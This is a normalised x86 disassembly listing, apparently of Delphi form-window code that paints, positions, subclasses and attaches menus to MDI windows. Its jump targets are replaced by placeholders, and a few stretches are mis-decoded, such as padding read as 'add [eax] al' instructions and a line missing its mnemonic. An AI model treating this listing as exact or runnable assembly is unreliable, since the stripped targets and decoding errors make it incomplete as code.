mov eax [ ebp - 0x8 ]
mov eax [ eax ]
sub eax 0xf
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0x5
je r-xdata
xor eax eax
push ebp
push sub_4607f2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call BeginPaint
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_42763c
push eax
lea edx [ ebp - 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x6c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x2b
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44b420
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetWindowRect
lea ecx [ ebp - 0x74 ]
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_446ac8
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebp - 0x58 ]
neg ecx
mov edx [ ebp - 0x5c ]
neg edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_4458c0
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push ebp
call sub_460598
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x45
jne r-xdata
retn
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call EndPaint
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetClientRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_42763c
push eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
call sub_460ac0
test eax eax
je r-xdata
push ebp
call sub_460598
pop ecx
push ebp
call sub_460598
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov dl 0x1
push ebp
call sub_4605e4
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0xffffffff
jmp r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
call sub_45d904
jmp r-xdata
sub_460804
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx eax
mov ecx esi
mov eax ebx
call sub_45eacc
mov eax [ ebx + 0x254 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x14
mov ecx [ esi + 0xc ]
mov edi [ esi + 0x4 ]
sub ecx edi
push ecx
mov ecx [ esi + 0x8 ]
mov edx [ esi ]
sub ecx edx
push ecx
push edi
push edx
push 0x1
push eax
call SetWindowPos
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
push esp
mov eax [ ebx + 0x254 ]
push eax
call GetClientRect
test eax eax
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebx + 0x254 ]
push eax
call InvalidateRect
sub_460870
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax ebx
call sub_45f168
mov eax ebx
call sub_44daa8
test al al
je r-xdata
mov eax ebx
call sub_4240cc
mov edi eax
dec edi
test edi edi
jl r-xdata
push 0xffffffec
mov eax ebx
call sub_44d7a4
push eax
call GetWindowLongA
and eax 0xffffefff
and eax 0xffffdfff
and eax 0xffffbfff
mov [ esp ] eax
mov edx esp
mov eax ebx
call sub_44a590
mov eax [ esp ]
push eax
push 0xffffffec
mov eax ebx
call sub_44d7a4
push eax
call SetWindowLongA
pop edx
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_4240a0
call sub_45ad20
mov edx esi
mov eax ebx
call sub_4240a0
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
sub_460908
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x1
xor edx edx
push ebp
push sub_460985
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
mov dl [ eax + 0x5f ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ rw-data ]
mov dl [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
sub_460990
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x228 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x228 ] al
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_44ad0c
sub_4609bc
push esi
mov esi eax
cmp dl [ esi + 0x229 ]
je r-xdata
pop esi
retn
mov eax edx
mov [ esi + 0x229 ] al
sub al 0x2
je r-xdata
mov dl 0x1
sub al 0x3
je r-xdata
mov eax esi
call sub_44ad0c
xor edx edx
jmp r-xdata
mov eax esi
call sub_45ec48
test [ esi + 0x1c ] 0x10
jne r-xdata
sub_4609f4
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov edi [ ebx + 0x30 ]
mov esi [ ebx + 0xa0 ]
mov ecx esp
mov eax ebx
call sub_446788
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp edi eax
jne r-xdata
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov eax ebx
call sub_44ad0c
sub_460a38
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_446894
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov al [ ebx + 0x229 ]
mov [ ebx + 0x280 ] al
mov [ ebx + 0x229 ] 0x0
mov al [ ebx + 0x280 ]
mov [ ebx + 0x229 ] al
jmp r-xdata
sub_460a8c
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x229
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
call sub_443e64
sub_460ac0
push ebx
push esi
push edi
xor edi edi
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_464630
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
inc edi
mov edx esi
mov eax [ rw-data ]
call sub_46461c
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_460b0c
push ebx
push esi
push edi
mov edi edx
cmp [ eax + 0x22f ] 0x2
jne r-xdata
xor eax eax
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_464630
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
dec edi
test edi edi
jl r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_46461c
cmp [ eax + 0x22f ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_460b5c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov edx [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx [ ebx + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx eax
mov eax ebx
call sub_41b4f8
mov al 0x1
pop ebx
pop ebp
retn 0x10
sub_460b8c
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov ebp rw-data
xor eax eax
mov [ esp ] eax
push 0x2
mov eax ebx
call sub_44d7a4
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi eax
mov eax [ ebp ]
call sub_464600
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp ]
call sub_464600
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
push eax
mov eax sub_460b5c
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp ]
call sub_464600
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_4645ec
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx esi
call sub_41b654
call sub_403390
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_4645ec
cmp edi [ eax + 0x4 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_4645ec
mov [ esp ] eax
jmp r-xdata
mov edx esi
mov eax [ ebp ]
call sub_4645ec
cmp edi [ eax + 0x4 ]
jne r-xdata
sub_460c90
push ebx
mov ebx eax
mov eax ebx
call sub_460c88
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x240 ]
call sub_42da98
test eax eax
jne r-xdata
mov al 0x1
pop ebx
retn
sub_460cb8
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22f ]
je r-xdata
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x230 ] 0x0
jne r-xdata
mov al [ esi + 0x22f ]
mov [ esi + 0x22f ] bl
cmp bl 0x2
je r-xdata
mov eax esi
call sub_44acc4
mov dl 0x1
mov eax esi
call sub_46101c
cmp [ esi + 0x1a5 ] 0x0
jne r-xdata
cmp al 0x2
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax esi
call sub_461098
mov edx eax
mov eax esi
call sub_447124
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_44ae60
mov dl 0x1
mov eax esi
call sub_46003c
sub_460d38
push ebx
push esi
push edi
push ebp
mov ebp eax
cmp [ ebp + 0x22f ] 0x2
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x254 ] 0x0
je r-xdata
xor esi esi
mov eax [ ebp + 0x248 ]
test eax eax
je r-xdata
xor edi edi
mov eax [ ebp + 0x258 ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov eax ebp
call sub_44d7a4
push eax
call GetMenu
cmp esi eax
setne bl
push edi
push esi
push 0x230
mov eax [ ebp + 0x254 ]
push eax
call SendMessageA
test bl bl
je r-xdata
call sub_45731c
mov edi eax
mov eax ebp
call sub_44d7a4
push eax
call DrawMenuBar
sub_460db4
push ebx
mov ebx edx
mov [ eax + 0x260 ] ebx
test ebx ebx
je r-xdata
pop ebx
retn
mov edx eax
mov eax ebx
call sub_423b78
xor edx edx
mov eax ebx
call sub_458cb4
sub_460dd8
push ebx
mov ebx eax
cmp edx [ ebx + 0x258 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x258 ] edx
test edx edx
je r-xdata
mov eax ebx
call sub_460d38
mov eax edx
mov edx ebx
call sub_423b78
sub_460e00
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_460fc6
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_464630
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x8
jne r-xdata
xor edx edx
call sub_45a868
inc eax
mov [ ebp - 0x4 ] eax
xor edi edi
xor esi esi
test esi esi
je r-xdata
inc edi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_46461c
cmp ebx eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
mov eax esi
call sub_423b78
mov [ ebx + 0x248 ] esi
test esi esi
je r-xdata
test [ esi + 0x1c ] 0x8
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_46461c
cmp esi [ eax + 0x248 ]
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc80
call sub_403b5c
mov eax ebx
call sub_44daa8
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
push 0x0
mov eax ebx
call sub_44d7a4
push eax
call SetMenu
mov eax [ ebx + 0x248 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_460d38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460fcd
lea eax [ ebp - 0x10 ]
call sub_404120
retn
mov dl 0x1
mov eax ebx
call sub_461ec4
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax ebx
call sub_44daa8
test al al
je r-xdata
mov eax ebx
call sub_44daa8
test al al
je r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
mov edi eax
mov eax ebx
call sub_44d7a4
push eax
call GetMenu
cmp edi eax
je r-xdata
push 0x0
mov eax ebx
call sub_44d7a4
push eax
call SetMenu
jmp r-xdata
mov eax ebx
call sub_44d7a4
mov edx eax
mov eax esi
call sub_45a868
jmp r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
push eax
mov eax ebx
call sub_44d7a4
push eax
call SetMenu
sub_460fe8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_460fd4
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
cmp esi 0x24
jl r-xdata
mov [ ebx + 0x25c ] esi
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub_461044
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_461038
cmp bl al
je r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x25c ] eax
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ esi + 0x25c ] eax
sub_4610b0
push ebx
mov ebx eax
mov eax ebx
call sub_44cd84
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x70 ] 0xff00000f
jne r-xdata
mov eax ebx
call sub_461098
cmp eax [ ebx + 0x70 ]
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_461098
mov edx eax
mov eax ebx
call sub_447124
mov edx 0xff00000f
mov eax ebx
call sub_447124
pop ebx
retn
sub_461134
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22b ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x22b ] bl
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax esi
call sub_44d7a4
push eax
call ShowWindow
sub_461174
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx eax
mov al [ ebx + 0x231 ]
test al al
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
cmp [ edx + 0x44 ] 0x0
je r-xdata
xor edx edx
mov [ esp ] edx
cmp al 0x2
jne r-xdata
mov al [ ebx + 0x231 ]
cmp al 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_460b8c
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
cmp al 0x1
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x68 ] 0x0
je r-xdata
mov eax ebx
call sub_460b8c
mov eax [ eax + 0x4 ]
mov [ esp + 0x4 ] eax
mov eax [ rw-data ]
call sub_464600
dec eax
test eax eax
jl r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_4645ec
mov eax [ eax + 0x4 ]
mov [ esp ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x68 ]
call sub_460b8c
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
inc eax
mov [ esp + 0x10 ] eax
xor esi esi
inc esi
dec [ esp + 0x10 ]
jne r-xdata
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_4645ec
mov eax [ eax + 0x4 ]
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_464600
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x8 ] 0x0
inc [ esp + 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x230 ]
cmp al 0x4
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_4645ec
mov eax [ eax + 0x4 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
cmp al 0x6
jne r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_4645ec
call sub_4642f0
push eax
mov edx esi
mov eax [ rw-data ]
call sub_4645ec
call sub_4642d4
sub eax ebp
sar eax 0x1
jns r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_4645ec
call sub_4642bc
mov ebp eax
add ebp [ ebx + 0x40 ]
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_4645ec
call sub_4642bc
sub ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_4645ec
call sub_4642bc
push eax
mov edx esi
mov eax [ rw-data ]
call sub_4645ec
call sub_464308
pop edx
add edx eax
mov eax [ ebx + 0x48 ]
add eax ebp
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_4645ec
call sub_4642f0
push eax
mov edx esi
mov eax [ rw-data ]
call sub_4645ec
call sub_4642d4
sub eax ebp
sar eax 0x1
jns r-xdata
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_4645ec
call sub_4642bc
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_4645ec
call sub_464308
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov edx esi
mov eax [ rw-data ]
call sub_4645ec
call sub_4642f0
add eax [ ebx + 0x44 ]
push eax
mov edx [ esp + 0xc ]
mov eax [ rw-data ]
call sub_4645ec
call sub_4642f0
pop edx
sub edx eax
mov [ esp + 0xc ] edx
mov edx esi
mov eax [ rw-data ]
call sub_4645ec
call sub_4642f0
push eax
mov edx esi
mov eax [ rw-data ]
call sub_4645ec
call sub_4642d4
pop edx
add edx eax
mov eax [ esp + 0xc ]
add eax [ ebx + 0x4c ]
cmp edx eax
jge r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_4645ec
call sub_4642bc
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_4645ec
call sub_464308
add ebp eax
sub ebp [ ebx + 0x48 ]
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_4645ec
call sub_4642bc
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_4645ec
call sub_464308
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ esp + 0x14 ]
mov edx ebp
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov edx esi
mov eax [ rw-data ]
call sub_4645ec
call sub_4642f0
push eax
mov edx esi
mov eax [ rw-data ]
call sub_4645ec
call sub_4642d4
pop edx
add edx eax
sub edx [ ebx + 0x4c ]
mov [ esp + 0xc ] edx
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
sub_4614c8
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
mov edx esi
mov eax edi
call sub_45ea7c
mov edx esi
mov eax edi
call sub_463e6c
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov [ esi + 0x24 ] 0x8
test [ edi + 0x1c ] 0x10
je r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov al [ edi + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x1c ] eax
and [ esi + 0x4 ] 0xbffcffff
mov bl [ edi + 0x228 ]
mov al [ edi + 0x229 ]
mov [ esp ] al
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x80000000
mov [ esi + 0x10 ] 0x80000000
or [ esi + 0x4 ] 0xcf0000
jmp r-xdata
xor eax eax
mov al [ esp ]
cmp eax 0x5
ja r-xdata
mov al [ esp ]
test al al
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
add al 0xfc
sub al 0x2
jae r-xdata
jmp [ eax * 4 + jump_table_461577 ]
mov [ esp ] 0x2
sub al 0x3
jne r-xdata
mov al [ esp ]
sub al 0x3
jae r-xdata
mov [ esi + 0x8 ] 0x80
lea edx [ esi + 0x8 ]
mov eax edi
call sub_44a590
mov al [ r-xdata ]
and al bl
mov ebx eax
cmp [ edi + 0x30 ] 0x0
jne r-xdata
or [ esi + 0x4 ] 0xc00000
jmp r-xdata
or [ esi + 0x4 ] 0xc40000
mov al [ edi + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ esi + 0x4 ]
or eax 0x80000000
or eax 0xc00000
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x101
lea edx [ esi + 0x8 ]
mov eax edi
call sub_44a590
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ edi + 0x22b ] 0x0
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov bl [ r-xdata ]
jmp r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov [ esi + 0x14 ] 0x80000000
mov [ esi + 0x18 ] 0x80000000
jmp r-xdata
sub al 0x2
jne r-xdata
mov al [ r-xdata ]
and al bl
mov ebx eax
mov [ esi + 0x24 ] 0x2808
mov eax [ esi + 0x4 ]
or eax __dos_header
or eax 0x80
mov [ esi + 0x4 ] eax
test bl 0x8
je r-xdata
or [ esi + 0x4 ] 0x80000
test bl 0x2
je r-xdata
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x80000000
test [ edi + 0x1d ] 0x2
je r-xdata
or [ esi + 0x8 ] 0x400
test bl 0x4
je r-xdata
or [ esi + 0x4 ] 0x20000
mov al [ edi + 0x22b ]
cmp al 0x1
jne r-xdata
cmp [ edi + 0x22f ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff3fffff
or [ esi + 0x4 ] 0x10000
cmp al 0x2
jne r-xdata
or [ esi + 0x4 ] 0x20000000
jmp r-xdata
mov eax DefMDIChildProcA
mov [ esi + 0x28 ] eax
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x1000000
jmp r-xdata
sub_4616d9
add [ eax ] al
add [ ecx ] cl
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_45ea8c
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al [ ebx + 0x22f ]
sub al 0x2
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_44d7a4
push eax
call SendMessageA
mov eax ebx
call sub_462038
push eax
push 0x1
push 0x80
mov eax ebx
call sub_44d7a4
push eax
call SendMessageA
jmp r-xdata
mov [ esp + 0x4 ] 0xff00
xor eax eax
mov [ esp ] eax
mov esi [ ebx + 0x258 ]
test esi esi
je r-xdata
dec al
je r-xdata
push 0x56330001
push 0x0
push 0x0
mov eax ebx
call sub_446988
push eax
mov eax ebx
call sub_4469cc
push eax
mov eax ebx
call sub_44d7a4
push eax
push 0x0
mov eax [ rw-data ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov edx r-xdata
xor ecx ecx
mov eax 0x200
call sub_406f28
mov [ ebx + 0x254 ] eax
push ebx
push sub_460624
call sub_424b38
mov [ ebx + 0x278 ] eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call GetWindowLongA
mov [ ebx + 0x274 ] eax
mov eax [ ebx + 0x278 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call SetWindowLongA
jmp r-xdata
mov eax esi
call sub_45731c
mov [ esp ] eax
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov eax ebx
call sub_44d7a4
push eax
call SetWindowPos
jmp r-xdata
sub_461826
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff4c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xb4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_461951
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov esi edx
lea edi [ ebp - 0xb0 ]
mov ecx 0x23
[ edi ] [ esi ]
and [ ebp - 0xa8 ] 0xfff7ffff
lea edx [ ebp - 0xb0 ]
mov eax ebx
call sub_44a8f4
and [ ebx + 0x2f4 ] 0xef
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0xb4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
call sub_403b5c
cmp [ eax + 0x254 ] 0x0
jne r-xdata
mov eax ebx
call sub_463d44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461958
lea eax [ edx + 0x4c ]
mov [ ebp - 0x24 ] eax
mov eax [ edx ]
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ edx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0x20 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
push 0x0
push 0x220
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
